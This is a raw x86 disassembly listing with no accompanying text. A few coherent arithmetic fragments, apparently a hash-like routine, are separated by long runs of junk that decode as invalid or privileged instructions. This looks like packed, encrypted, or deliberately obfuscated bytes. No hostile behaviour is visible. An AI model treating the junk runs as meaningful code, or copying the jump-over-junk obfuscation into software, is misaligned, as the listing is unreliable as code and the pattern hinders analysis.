  41385f:	imul   ecx,ecx,0xffffffc0
  413862:	cwde   
  413863:	pop    edx
  413864:	push   0xa51537b5
  413869:	fwait
  41386a:	js     0x4138e6
  41386c:	xchg   ecx,eax
  41386d:	mov    BYTE PTR [ecx+0x1c],dh
  413870:	add    eax,DWORD PTR [eax]
  413872:	call   0xd8544769
  413877:	add    eax,0x53f1383d
  41387c:	add    BYTE PTR [esi+0x2983de2b],bl
  413882:	and    dl,BYTE PTR [edx-0x2]
  413885:	or     dh,BYTE PTR [ebp-0x5e]
  413888:	ja     0x413854
  41388a:	pop    ebp
  41388b:	rol    eax,0x5e
  41388e:	mov    ds,WORD PTR [eax+edx*4-0x60]
  413892:	hlt    
  413893:	fldenv [ebx-0x19bb6ed1]
  413899:	mov    ebx,DWORD PTR [ebp-0x1c]
  41389c:	xor    ecx,0x1b8b
  4138a2:	xor    edi,edi
  4138a4:	xor    edx,edi
  4138a6:	add    ecx,eax
  4138a8:	mov    eax,DWORD PTR [ebp+0xc]
  4138ab:	adc    edx,ebx
  4138ad:	mov    DWORD PTR [eax],ecx
  4138af:	mov    DWORD PTR [eax+0x4],edx
  4138b2:	mov    eax,DWORD PTR [ebp-0x30]
  4138b5:	mov    ecx,DWORD PTR [ebp-0x2c]
  4138b8:	mov    edx,0xbdb2
  4138bd:	sub    edx,eax
  4138bf:	mov    eax,DWORD PTR [ebp-0x28]
  4138c2:	mov    ebx,0x4c02
  4138c7:	sbb    ebx,ecx
  4138c9:	mov    ecx,DWORD PTR [ebp-0x24]
  4138cc:	sub    edx,eax
  4138ce:	mov    eax,DWORD PTR [ebp+0xc]
  4138d1:	sbb    ebx,ecx
  4138d3:	jmp    0x413cab
  4138d8:	out    0x56,eax
  4138da:	inc    ecx
  4138db:	jp     0x4138fd
  4138dd:	jp     0x413881
  4138df:	sub    bh,BYTE PTR [edx]
  4138e1:	xchg   edx,eax
  4138e2:	cmp    DWORD PTR [edx+0xb],ebp
  4138e5:	or     ebp,eax
  4138e7:	jl     0x4138e0
  4138e9:	cmp    bl,BYTE PTR [eax]
  4138eb:	sbb    BYTE PTR [edx-0x49e7e7ee],ch
  4138f1:	mov    al,ds:0xdab4e0c0
  4138f6:	outs   dx,DWORD PTR ds:[esi]
  4138f7:	hlt    
  4138f8:	shl    DWORD PTR [ebx],1
  4138fa:	jecxz  0x4138d8
  4138fc:	dec    eax
  4138fd:	adc    eax,0x1eb2aa27
  413902:	cmp    ah,BYTE PTR [edx+0x43]
  413905:	sbb    bh,BYTE PTR [edi+esi*2]
  413908:	test   eax,0xbbda83bd
  41390d:	in     eax,dx
  41390e:	mov    esp,0xf936226d
  413913:	clc    
  413914:	push   DWORD PTR [ebx+0x32cef107]
  41391a:	adc    al,0xd9
  41391c:	cs retf 
  41391e:	cs inc eax
  413920:	rcl    BYTE PTR [ebp-0xa7d4639],cl
  413926:	or     DWORD PTR [ebx+0x2b0ba3f0],ebx
  41392c:	pop    ebp
  41392d:	call   0x3ccf7882
  413932:	lods   eax,DWORD PTR ds:[esi]
  413933:	mov    dh,0xe5
  413935:	cmp    eax,0x80c607c2
  41393a:	pop    edx
  41393b:	adc    edi,ecx
  41393d:	fwait
  41393e:	inc    eax
  41393f:	mov    gs,WORD PTR [edx]
  413941:	outs   dx,DWORD PTR ds:[esi]
  413942:	push   0x5351063c
  413947:	mov    edx,DWORD PTR [edi]
  413949:	jp     0x413981
  41394b:	jecxz  0x413928
  41394d:	push   esp
  41394e:	jne    0x41391f
  413950:	test   al,0xbd
  413952:	jl     0x41394f
  413954:	pop    edx
  413955:	xchg   ebx,eax
  413956:	ret    
  413957:	or     edx,DWORD PTR [edx-0x78]
  41395a:	sub    eax,0x54747f81
  41395f:	mov    eax,0x7e82f75
  413964:	mov    ds:0x5562caf0,al
  413969:	jb     0x4139c3
  41396b:	in     eax,dx
  41396c:	adc    esi,edx
  41396e:	ds jb  0x4138f3
  413971:	dec    edx
  413972:	sub    ah,cl
  413974:	das    
  413975:	mov    ecx,DWORD PTR [ecx+0x60]
  413978:	bound  ecx,QWORD PTR [esi-0x16c16e36]
  41397e:	test   DWORD PTR [ebp-0x6f8286c1],ebx
  413984:	cmp    DWORD PTR [ebx-0x20],esp
  413987:	mov    dl,0x64
  413989:	fcomp  QWORD PTR [edi+0x1285f10d]
  41398f:	iret   
  413990:	cmc    
  413991:	test   BYTE PTR [edi],al
  413993:	int    0xd8
  413995:	icebp  
  413996:	cdq    
  413997:	stos   BYTE PTR es:[edi],al
  413998:	mov    edi,0xc5c8a469
  41399d:	test   DWORD PTR [eax+esi*2],ebp
  4139a0:	aad    0x68
  4139a2:	dec    edx
  4139a3:	push   0x74
  4139a5:	sbb    BYTE PTR [esi+0x5ceca40c],al
  4139ab:	ins    DWORD PTR es:[edi],dx
  4139ac:	outs   dx,DWORD PTR ds:[esi]
  4139ad:	call   0xfa72:0xe2e5b5b1
  4139b4:	outs   dx,BYTE PTR ds:[esi]
  4139b5:	pop    esp
  4139b6:	popa   
  4139b7:	fwait
  4139b8:	in     al,dx
  4139b9:	popa   
  4139ba:	lods   al,BYTE PTR ds:[esi]
  4139bb:	and    al,0xd1
  4139bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4139be:	push   ss
  4139bf:	inc    ecx
  4139c0:	(bad)  
  4139c1:	(bad)  
  4139c2:	push   ebp
  4139c3:	dec    edi
  4139c4:	js     0x4139db
  4139c6:	lods   eax,DWORD PTR ds:[esi]
  4139c7:	repz mov WORD PTR [edi-0x6cab632a],?
  4139ce:	dec    edi
  4139cf:	je     0x413a06
  4139d1:	jmp    0x9a517574
  4139d6:	dec    edi
  4139d7:	jle    0x413a49
  4139d9:	fld    TBYTE PTR [edx+ecx*4]
  4139dc:	nop
  4139dd:	not    BYTE PTR [eax-0x4a9db9ec]
  4139e3:	scas   eax,DWORD PTR es:[edi]
  4139e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4139e5:	add    al,0xd3
  4139e7:	int3   
  4139e8:	retf   
  4139e9:	sbb    DWORD PTR [esi],esi
  4139eb:	pop    ebp
  4139ec:	mov    BYTE PTR ds:0x76f28f8f,ch
  4139f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4139f3:	sbb    ebx,DWORD PTR [eax+edi*1]
  4139f6:	cmp    esi,DWORD PTR [esi]
  4139f8:	adc    BYTE PTR [ecx+0x27dac5a5],dl
  4139fe:	add    BYTE PTR [esi+0x38],dh
  413a01:	aad    0x38
  413a03:	sbb    eax,0xc32a4907
  413a08:	ret    0xd6c1
  413a0b:	or     eax,0x29c5f6c5
  413a10:	js     0x413a80
  413a12:	xchg   edx,eax
  413a13:	pop    ebx
  413a14:	imul   ebx,DWORD PTR [eax+0x62],0x49
  413a18:	mov    eax,ds:0x6f324cc0
  413a1e:	adc    BYTE PTR [esi],ah
  413a20:	mov    ch,0xb6
  413a22:	push   edx
  413a23:	push   esp
  413a24:	call   0x6a48:0xeaa42a92
  413a2b:	jbe    0x413a22
  413a2d:	clc    
  413a2e:	cmp    ebp,eax
  413a30:	push   edi
  413a31:	inc    esp
  413a32:	jg     0x413a50
  413a34:	xor    al,0xca
  413a36:	popa   
  413a37:	sti    
  413a38:	sbb    ecx,esp
  413a3a:	retf   0x80ce
  413a3d:	daa    
  413a3e:	sub    eax,0x1ebcb2a5
  413a43:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413a44:	inc    eax
  413a45:	mov    ebp,0x14c5af74
  413a4a:	and    al,0x5e
  413a4c:	mov    BYTE PTR [edx],0x47
  413a4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413a50:	add    BYTE PTR [eax-0x64],ah
  413a53:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413a54:	sub    DWORD PTR [eax-0x6b],ecx
  413a57:	in     al,0x3a
  413a59:	jnp    0x413a8f
  413a5b:	adc    al,0x5f
  413a5d:	add    edi,DWORD PTR [edx]
  413a5f:	cmp    bh,BYTE PTR [ecx+0x22]
  413a62:	cwde   
  413a63:	xor    bl,BYTE PTR [edi-0x27]
  413a66:	xchg   edx,eax
  413a67:	leave  
  413a68:	addr16 aad 0x2f
  413a6b:	jl     0x413a45
  413a6d:	pop    es
  413a6e:	test   DWORD PTR [ecx],0xc0a35599
  413a74:	cwde   
  413a75:	retf   
  413a76:	stos   DWORD PTR es:[edi],eax
  413a77:	sbb    DWORD PTR [edi-0x5de31f8d],eax
  413a7d:	dec    edi
  413a7e:	fcmovnbe st,st(5)
  413a80:	jnp    0x413a42
  413a82:	mov    dl,0x18
  413a84:	stos   BYTE PTR es:[edi],al
  413a85:	push   esi
  413a86:	mov    dh,BYTE PTR [ebp+0x2112af0b]
  413a8c:	inc    ecx
  413a8d:	xchg   ebp,eax
  413a8e:	dec    ebx
  413a8f:	inc    ebp
  413a90:	les    esp,FWORD PTR [esp+eax*8-0x61]
  413a94:	mov    ch,0xdd
  413a96:	lock jbe 0x413a58
  413a99:	mov    eax,0xca3ca19f
  413a9e:	xchg   edi,eax
  413a9f:	jae    0x413a94
  413aa1:	jge    0x413ad8
  413aa3:	sar    DWORD PTR [edi],cl
  413aa5:	jns    0x413a8e
  413aa7:	jo     0x413a93
  413aa9:	mov    ebp,0x436846cd
  413aae:	pop    edx
  413aaf:	push   eax
  413ab0:	ficomp DWORD PTR [ecx]
  413ab2:	sub    BYTE PTR [edx+0x39],cl
  413ab5:	adc    al,0x9b
  413ab7:	in     al,0x9f
  413ab9:	enter  0x6957,0x1e
  413abd:	jp     0x413b0c
  413abf:	fisub  WORD PTR [eax+0x3935b271]
  413ac5:	or     al,0x5c
  413ac7:	mov    bh,0x18
  413ac9:	test   BYTE PTR [ebx+eiz*2],ch
  413acc:	sbb    BYTE PTR [ebp-0x13],0x80
  413ad0:	xchg   ebx,eax
  413ad1:	xlat   BYTE PTR ds:[ebx]
  413ad2:	or     eax,0x25ad4075
  413ad7:	mov    bh,0x30
  413ad9:	call   FWORD PTR [ebp-0x3]
  413adc:	dec    edx
  413add:	(bad)  
  413ade:	mov    edx,DWORD PTR [edx-0x2e11791c]
  413ae4:	retf   0x997f
  413ae7:	loop   0x413a8e
  413ae9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413aea:	out    0xbd,eax
  413aec:	repz dec edx
  413aee:	pop    edi
  413aef:	pop    esi
  413af0:	or     BYTE PTR [ebx],0xa4
  413af3:	adc    DWORD PTR [edx+0x6f],ebp
  413af6:	xor    esi,ebp
  413af8:	jno    0x413b62
  413afa:	jg     0x413afb
  413afc:	shl    BYTE PTR [edx+0x6e7d710c],cl
  413b02:	pop    ecx
  413b03:	stos   DWORD PTR es:[edi],eax
  413b04:	mov    ds,WORD PTR [eax+ebp*2]
  413b07:	push   ebx
  413b08:	jno    0x413a9b
  413b0a:	mov    al,ds:0x626f94bd
  413b0f:	push   esi
  413b10:	in     al,0xd9
  413b12:	pop    ebp
  413b13:	outs   dx,DWORD PTR ds:[esi]
  413b14:	xchg   ecx,eax
  413b15:	jne    0x413b62
  413b17:	xor    BYTE PTR [ebx-0x17375508],0x3d
  413b1e:	xchg   edi,eax
  413b1f:	push   ebx
  413b20:	sti    
  413b21:	or     al,bl
  413b23:	pop    edx
  413b24:	rol    esp,cl
  413b26:	mov    eax,ds:0xa1458002
  413b2b:	jne    0x413ac6
  413b2d:	sub    DWORD PTR [eax-0x6d22ad85],ebx
  413b33:	gs push ebx
  413b35:	imul   edx,DWORD PTR [ebx],0x60
  413b38:	aam    0x7d
  413b3a:	lds    edi,FWORD PTR ds:0xd5759fb8
  413b40:	gs pop edi
  413b42:	push   ds
  413b43:	sahf   
  413b44:	pop    ebx
  413b45:	call   0x93b5:0xae25f10f
  413b4c:	sahf   
  413b4d:	dec    eax
  413b4e:	xchg   edx,eax
  413b4f:	retf   
  413b50:	clc    
  413b51:	test   al,0xbe
  413b53:	and    al,0x3e
  413b55:	adc    BYTE PTR [ebx-0x5e9aba6e],bh
  413b5b:	cmp    eax,0x7dcb799f
  413b60:	jb     0x413bcc
  413b62:	mov    esp,0xd69e8265
  413b67:	jge    0x413bb7
  413b69:	cmp    edi,DWORD PTR [ebx+0x51c07227]
  413b6f:	cmp    BYTE PTR [edi-0x546f1376],dh
  413b75:	dec    esp
  413b76:	leave  
  413b77:	or     eax,0x38fd8ffd
  413b7c:	mov    esi,0x8a2c4a43
  413b81:	pop    ebp
  413b82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413b83:	and    bl,BYTE PTR [eax-0x15]
  413b86:	fisttp WORD PTR [esi]
  413b88:	(bad)  
  413b8a:	loope  0x413bea
  413b8c:	xor    ebx,DWORD PTR [edx]
  413b8e:	mov    cl,BYTE PTR [edx+0x14]
  413b91:	pop    esi
  413b92:	mov    dh,0xb2
  413b94:	pop    edi
  413b95:	js     0x413bc6
  413b97:	cs lods al,BYTE PTR ss:[esi]
  413b9a:	mov    al,ds:0x7c01f720
  413b9f:	mov    esi,0xe8f1bf6a
  413ba4:	fidiv  DWORD PTR [ebp-0x19]
  413ba7:	cmp    cl,ch
  413ba9:	mov    dh,0x6f
  413bab:	and    DWORD PTR [edi+0x31fdcc2],edi
  413bb1:	mov    edx,0x88e61e89
  413bb6:	inc    ecx
  413bb7:	cmp    eax,DWORD PTR ds:0x51a65007
  413bbd:	inc    ebx
  413bbe:	dec    edx
  413bbf:	ss stc 
  413bc1:	inc    esi
  413bc2:	(bad)  
  413bc3:	mov    edx,0xfdd5f135
  413bc8:	or     esi,DWORD PTR [esi-0x59ca7739]
  413bce:	sub    ebp,ebx
  413bd0:	mov    gs,WORD PTR [ebx*1+0x180fa8fe]
  413bd7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413bd8:	adc    bl,0xda
  413bdb:	neg    BYTE PTR [ebp+0x15]
  413bde:	in     eax,0x47
  413be0:	shr    eax,cl
  413be2:	leave  
  413be3:	sub    eax,0xe1ad2195
  413be8:	and    ah,BYTE PTR [ebx+0x2ddcef38]
  413bee:	ror    DWORD PTR [ebp+0x52],1
  413bf1:	call   0x686c:0xec9bad92
  413bf8:	lds    esp,FWORD PTR [ebx-0x2f]
  413bfb:	mov    esp,esi
  413bfd:	shl    ebp,1
  413bff:	pop    ss
  413c00:	nop
  413c01:	jnp    0x413bab
  413c03:	(bad)
  413c07:	je     0x413c4f
  413c09:	jne    0xf462a26
  413c0f:	bound  esp,QWORD PTR [eax-0x11aba8a3]
  413c15:	gs dec esi
  413c17:	in     eax,0xdf
  413c19:	sti    
  413c1a:	int3   
  413c1b:	push   esi
  413c1c:	sbb    BYTE PTR [edi],ch
  413c1e:	loopne 0x413c35
  413c20:	call   0x8a678fe5
  413c25:	xchg   esi,eax
  413c26:	pop    esi
  413c27:	sbb    esi,eax
  413c29:	and    ah,BYTE PTR [eax]
  413c2b:	jno    0x413c89
  413c2d:	std    
  413c2e:	cmp    edi,edi
  413c30:	cmc    
  413c31:	test   eax,edi
  413c33:	bound  ebx,QWORD PTR [esp+esi*8-0x35]
  413c37:	js     0x413c61
  413c39:	xchg   ecx,eax
  413c3a:	and    al,0x6e
  413c3c:	push   es
  413c3d:	call   0xc0df:0x5ac623b3
  413c44:	ds ins BYTE PTR es:[edi],dx
  413c46:	hlt    
  413c47:	(bad)  [edi+0x22f4b60b]
  413c4d:	xor    eax,0x6f4b736a
  413c52:	adc    al,0xd8
  413c54:	pop    ds
  413c55:	retf   
  413c56:	pop    esi
  413c57:	aaa    
  413c58:	test   al,0x4f
  413c5a:	or     eax,0x723383f5
  413c5f:	sbb    ebp,DWORD PTR [ecx+0x35d2984c]
  413c65:	sti    
  413c66:	stos   DWORD PTR es:[edi],eax
  413c67:	xchg   BYTE PTR [ecx+0x6faed8ff],al
  413c6d:	dec    DWORD PTR [edx]
  413c6f:	ret    0x9d47
  413c72:	lock pop ecx
  413c74:	ds mov bh,0x12
  413c77:	inc    edi
  413c78:	imul   esi,esi,0x52
  413c7b:	popa   
  413c7c:	clc    
  413c7d:	fdiv   DWORD PTR [ebx+0x77]
  413c80:	mov    ds:0x14c96d1b,al
  413c85:	mov    edx,0xdbca939
  413c8a:	in     eax,dx
  413c8b:	fild   DWORD PTR [ecx-0x5d5f4056]
  413c91:	xor    ecx,DWORD PTR [esi]
  413c93:	icebp  
  413c94:	adc    cl,bl
  413c96:	paddsw mm6,QWORD PTR [edi]
  413c99:	xchg   BYTE PTR [esi],cl
  413c9b:	test   eax,0xd4475c19
  413ca0:	mov    ch,0x46
  413ca2:	jnp    0x413c4e
  413ca4:	mov    ds:0x96c725a5,eax
  413ca9:	mov    ?,WORD PTR [eax+0x4d8b1003]
  413caf:	fcom   DWORD PTR [ebx]
  413cb1:	pop    eax
  413cb2:	add    al,0x6a
  413cb4:	add    dh,BYTE PTR [ebx]
  413cb6:	fimul  WORD PTR [ebx+0x2b5edc75]
  413cbc:	icebp  
  413cbd:	mov    ecx,DWORD PTR [ebp-0x30]
  413cc0:	sub    esi,ecx
  413cc2:	mov    eax,ebx
  413cc4:	mov    ebx,DWORD PTR [ebp-0x2c]
  413cc7:	mov    ecx,DWORD PTR [ebp+0xc]
  413cca:	add    esi,DWORD PTR [ecx]
  413ccc:	xor    edx,0xca79a577
  413cd2:	shrd   edx,eax,0x2
  413cd6:	xor    ecx,ecx
  413cd8:	shl    esi,0x1e
  413cdb:	xor    ecx,edi
  413cdd:	shr    eax,0x2
  413ce0:	or     ecx,edx
  413ce2:	xor    esi,0x40000000
  413ce8:	or     esi,eax
  413cea:	mov    DWORD PTR [ebp-0x40],ecx
  413ced:	jmp    0x4140c5
  413cf2:	mov    ebx,0xbaf9bbd6
  413cf7:	fcomp  QWORD PTR [edx-0x1ad0e566]
  413cfd:	stos   BYTE PTR es:[edi],al
  413cfe:	test   eax,0x89b0ab0d
  413d03:	xor    bl,BYTE PTR [eax]
  413d05:	sbb    BYTE PTR [edx-0x7ee7e7ee],ch
  413d0b:	or     eax,0x81eb3168
  413d10:	inc    edx
  413d11:	push   ebx
  413d12:	dec    edi
  413d13:	xchg   edx,eax
  413d14:	xor    al,cl
  413d16:	push   esi
  413d17:	and    BYTE PTR [ebx],ah
  413d19:	xchg   ebp,eax
  413d1a:	leave  
  413d1b:	xchg   BYTE PTR [edx+0x6c],ch
  413d1e:	dec    eax
  413d1f:	inc    eax
  413d20:	shl    dh,0x1a
  413d23:	ss push ss
  413d25:	retf   
  413d26:	jle    0x413d55
  413d28:	mov    DWORD PTR [edx-0x58],esi
  413d2b:	cmp    dh,ch
  413d2d:	sub    BYTE PTR [ebx-0x22],dl
  413d30:	sahf   
  413d31:	xchg   ebx,eax
  413d32:	pushf  
  413d33:	cmp    BYTE PTR [edx-0xf],bh
  413d36:	minps  xmm0,XMMWORD PTR [esi]
  413d39:	add    cl,dh
  413d3b:	out    0x61,eax
  413d3d:	sbb    edi,DWORD PTR [edi]
  413d3f:	pop    ecx
  413d40:	shl    BYTE PTR [ecx],cl
  413d42:	jmp    0x5b751f50
  413d47:	sahf   
  413d48:	lds    ebp,FWORD PTR [ebx]
  413d4a:	shr    eax,1
  413d4c:	xchg   ebp,eax
  413d4d:	jne    0x413daf
  413d4f:	mov    ds:0xb95d07d9,al
  413d54:	xor    bh,BYTE PTR [ecx]
  413d56:	out    dx,al
  413d57:	test   esp,ecx
  413d59:	jne    0x413d04
  413d5b:	lods   al,BYTE PTR ds:[esi]
  413d5c:	sub    al,0xbf
  413d5e:	popf   
  413d5f:	dec    esi
  413d60:	ja     0x413cfa
  413d62:	push   ds
  413d63:	(bad)  
  413d64:	aas    
  413d65:	jmp    0x44e799e6
  413d6a:	push   edi
  413d6b:	imul   esp,DWORD PTR [edx+0x1d],0x4fb39629
  413d72:	sub    DWORD PTR [ebx+ebp*4+0x6d8428fb],edi
  413d79:	inc    esp
  413d7a:	mov    dl,0x74
  413d7c:	jg     0x413d19
  413d7e:	xor    bh,dl
  413d80:	std    
  413d81:	mov    ah,0xad
  413d83:	mov    esi,0x3e096d4c
  413d88:	cmp    al,0x2b
  413d8a:	nop
  413d8b:	sbb    edi,esi
  413d8d:	sbb    dh,BYTE PTR [edi+eax*1-0x69]
  413d91:	or     ebp,esp
  413d93:	sti    
  413d94:	cs imul ebx,edi,0xffffffd2
  413d98:	pop    edi
  413d99:	mov    BYTE PTR [ebp-0x467312d1],bh
  413d9f:	inc    edi
  413da0:	or     ebx,esi
  413da2:	inc    ebp
  413da3:	or     BYTE PTR [ebp-0x76a7579d],ch
  413da9:	xchg   edi,eax
  413daa:	adc    dl,0x1a
  413dad:	test   al,al
  413daf:	cli    
  413db0:	outs   dx,BYTE PTR ds:[esi]
  413db1:	inc    edi
  413db2:	xor    esp,eax
  413db4:	jae    0x413dae
  413db6:	inc    edi
  413db7:	(bad)  
  413db9:	jno    0x413e1d
  413dbb:	stos   BYTE PTR es:[edi],al
  413dbc:	xchg   ebp,eax
  413dbd:	mov    ds:0x611bedbd,al
  413dc2:	mov    cl,0xbf
  413dc4:	jg     0x413dbe
  413dc6:	into   
  413dc7:	xchg   esi,eax
  413dc8:	lods   eax,DWORD PTR ds:[esi]
  413dc9:	jno    0x413dc8
  413dcb:	cmc    
  413dcc:	xchg   ebx,eax
  413dcd:	or     al,0x5b
  413dcf:	shl    BYTE PTR ds:0xf3f5ebc1,0x71
  413dd6:	cmp    edx,DWORD PTR [ebp+0x40]
  413dd9:	adc    al,0xab
  413ddb:	leave  
  413ddc:	xchg   DWORD PTR [esi],esp
  413dde:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413ddf:	jnp    0x413d70
  413de1:	lahf   
  413de2:	(bad)  
  413de3:	xchg   DWORD PTR [ecx+0x686af974],ecx
  413de9:	push   eax
  413dea:	cmp    ch,BYTE PTR [edi+0x64fa0b00]
  413df0:	lea    ebp,[esi]
  413df2:	cmp    al,0x47
  413df4:	mov    DWORD PTR ds:0x58be151c,eax
  413dfa:	jb     0x413e5c
  413dfc:	(bad)  
  413dfd:	mov    cl,0x36
  413dff:	repz jo 0x413e11
  413e02:	mov    bl,0xef
  413e04:	xor    BYTE PTR [ebx+0xbcac6f9],al
  413e0a:	inc    esp
  413e0b:	push   ss
  413e0c:	iret   
  413e0d:	mov    WORD PTR [ecx+edi*8-0x4cf5107f],es
  413e14:	mov    esi,0xe00c78eb
  413e19:	mov    bl,0x2c
  413e1b:	sub    esi,DWORD PTR [ecx-0x70e21049]
  413e21:	jnp    0x413e08
  413e23:	inc    ecx
  413e24:	lds    ebx,FWORD PTR [edx+0x35b740aa]
  413e2a:	adc    al,0x3e
  413e2c:	cmc    
  413e2d:	add    ecx,DWORD PTR [edi-0x1d381fce]
  413e33:	jp     0x413e01
  413e35:	cs push eax
  413e37:	arpl   bx,bx
  413e39:	adc    esi,edx
  413e3b:	mov    esp,0x7d360ea2
  413e40:	push   cs
  413e41:	and    al,0x5f
  413e43:	pop    edx
  413e44:	rol    edi,1
  413e46:	jmp    0x1c889e67
  413e4b:	out    0x41,al
  413e4d:	fisttp QWORD PTR [edi+0x1d]
  413e50:	inc    eax
  413e51:	sbb    ah,BYTE PTR [ebp-0x61e991c8]
  413e57:	sub    eax,0x74a05ebd
  413e5c:	and    edx,DWORD PTR [edi-0xc]
  413e5f:	fild   QWORD PTR ds:0x519e59af
  413e65:	pop    edi
  413e66:	dec    ebx
  413e67:	xchg   ecx,eax
  413e68:	sbb    dl,dh
  413e6a:	lods   eax,DWORD PTR ds:[esi]
  413e6b:	sub    BYTE PTR [edx],0xd
  413e6e:	mul    eax
  413e70:	mov    eax,ds:0x96b67334
  413e75:	or     bl,BYTE PTR [ebx+esi*4-0x177d2be0]
  413e7c:	out    0x4e,eax
  413e7e:	(bad)  [eax]
  413e80:	jecxz  0x413e73
  413e82:	xchg   BYTE PTR [ebp+0x38],ah
  413e85:	sbb    eax,0xb6b44a29
  413e8a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413e8b:	sti    
  413e8c:	or     ebx,edx
  413e8e:	and    esi,DWORD PTR [ebx-0x5b08c79]
  413e94:	iret   
  413e95:	xor    eax,0x25d64439
  413e9a:	jne    0x413e65
  413e9c:	shl    BYTE PTR [ecx+0x43],1
  413e9f:	jns    0x413e7f
  413ea1:	mov    dl,0xf0
  413ea3:	mov    dl,0x68
  413ea5:	das    
  413ea6:	hlt    
  413ea7:	pop    edx
  413ea8:	xor    ecx,0xcf69a981
  413eae:	iret   
  413eaf:	test   eax,0x515dc4b
  413eb4:	jecxz  0x413f17
  413eb6:	xor    esp,DWORD PTR [esi+0x78]
  413eb9:	mov    edx,0x5666eced
  413ebe:	jecxz  0x413e7d
  413ec0:	test   eax,0xcd0a2cc3
  413ec5:	cmp    cl,dl
  413ec7:	mov    dl,BYTE PTR [ecx-0x8d82acb]
  413ecd:	and    eax,0xce82234
  413ed2:	fist   WORD PTR [edi+0x6d]
  413ed5:	fs in  al,0x62
  413ed8:	in     al,0x6f
  413eda:	mov    bl,0x51
  413edc:	push   cs
  413edd:	popa   
  413ede:	xchg   ecx,eax
  413edf:	sbb    DWORD PTR [esi+0x5b],edx
  413ee2:	icebp  
  413ee3:	xchg   edi,eax
  413ee4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413ee5:	and    DWORD PTR [ecx-0x6aa793f6],0xffffffde
  413eec:	fsub   DWORD PTR [ebp+0x15]
  413eef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413ef0:	add    DWORD PTR [ebx+esi*4+0x5df67604],0xffffffa0
  413ef8:	fcmovb st,st(0)
  413efa:	adc    DWORD PTR [edi-0x28],edx
  413efd:	and    ah,BYTE PTR [esi-0x9]
  413f00:	xchg   esi,eax
  413f01:	(bad)  
  413f02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413f03:	nop
  413f04:	ds in  al,0x12
  413f07:	icebp  
  413f08:	sar    esi,0xa1
  413f0b:	pop    es
  413f0c:	jb     0x413efa
  413f0e:	cmp    edi,eax
  413f10:	stos   BYTE PTR es:[edi],al
  413f11:	ret    0x8e12
  413f14:	mov    cl,0x4a
  413f16:	inc    ebp
  413f17:	leave  
  413f18:	dec    ebp
  413f19:	and    eax,0x3d71f148
  413f1e:	xchg   DWORD PTR [ecx+eiz*2-0x2],ebp
  413f22:	jecxz  0x413ed9
  413f24:	pop    ss
  413f25:	add    ah,BYTE PTR [esi]
  413f27:	int3   
  413f28:	jmp    0x4842:0xac623995
  413f2f:	push   eax
  413f30:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413f31:	pushf  
  413f32:	test   eax,0xc9aea02
  413f37:	xchg   edx,eax
  413f38:	mov    WORD PTR [ebx],?
  413f3a:	fst    QWORD PTR ds:[edx]
  413f3d:	sar    BYTE PTR [ebp+0x234e4c97],1
  413f43:	test   BYTE PTR [esi+0x68],dl
  413f46:	das    
  413f47:	pop    esp
  413f48:	test   dh,cl
  413f4a:	pop    ecx
  413f4b:	xor    al,0x65
  413f4d:	mov    ecx,DWORD PTR [esp+edi*1+0x71592eb8]
  413f54:	xchg   edi,eax
  413f55:	ins    BYTE PTR es:[edi],dx
  413f56:	pop    DWORD PTR [ebx-0x70]
  413f59:	cwde   
  413f5a:	scas   eax,DWORD PTR es:[edi]
  413f5b:	xor    DWORD PTR [esi+0xb17b997],edx
  413f61:	jno    0x413f62
  413f63:	test   eax,0xff605416
  413f68:	cvtdq2ps xmm2,XMMWORD PTR [ecx+esi*2]
  413f6c:	int    0xe2
  413f6e:	xor    DWORD PTR [edx+0x1d3326b6],ebx
  413f74:	out    0xb1,al
  413f76:	aas    
  413f77:	gs in  eax,0xb6
  413f7a:	mov    ebx,0x1a6747ee
  413f7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413f80:	mov    esi,0x26875b14
  413f85:	dec    edx
  413f86:	adc    al,0x3e
  413f88:	retf   
  413f89:	int    0x2c
  413f8b:	dec    dx
  413f8d:	push   0x24
  413f8f:	inc    edi
  413f90:	pop    ecx
  413f91:	lahf   
  413f92:	mov    eax,ds:0xd21417dd
  413f97:	mov    dl,0x28
  413f99:	cld    
  413f9a:	jmp    0x19c9abde
  413f9f:	jbe    0x413f29
  413fa1:	adc    eax,0x5f6c4eec
  413fa6:	mov    ch,0xd6
  413fa8:	cmp    DWORD PTR [eax],0x7ebde32d
  413fae:	jmp    0x25fc:0xaf94a6c5
  413fb5:	push   ss
  413fb6:	ror    cl,cl
  413fb8:	adc    bl,BYTE PTR [ecx]
  413fba:	cdq    
  413fbb:	je     0x413ffc
  413fbd:	inc    esi
  413fbe:	push   ecx
  413fbf:	mov    es,esi
  413fc1:	fsubr  st,st(4)
  413fc3:	lahf   
  413fc4:	sub    edx,DWORD PTR ds:0xaec6b9e
  413fca:	ror    DWORD PTR [edi+0x70],0xc8
  413fce:	cmc    
  413fcf:	jnp    0x413f5c
  413fd1:	loope  0x413f69
  413fd3:	mov    ds:0x4d163bd5,eax
  413fd8:	push   ds
  413fd9:	add    cl,BYTE PTR [eax]
  413fdb:	or     al,0x48
  413fdd:	loope  0x41402f
  413fdf:	clc    
  413fe0:	xchg   edx,eax
  413fe1:	pop    ebp
  413fe2:	add    dl,BYTE PTR [ecx-0x25]
  413fe5:	xor    esi,DWORD PTR [ebx+0x6a]
  413fe8:	xchg   ecx,eax
  413fe9:	adc    BYTE PTR ds:0xdb6e876f,bh
  413fef:	push   ebp
  413ff0:	es push ds
  413ff2:	rcl    BYTE PTR [edx+0x317afaff],cl
  413ff8:	ins    BYTE PTR es:[edi],dx
  413ff9:	fwait
  413ffa:	sbb    ah,BYTE PTR [edi+0x5f]
  413ffd:	mov    dh,0xdc
  413fff:	out    0x1,al
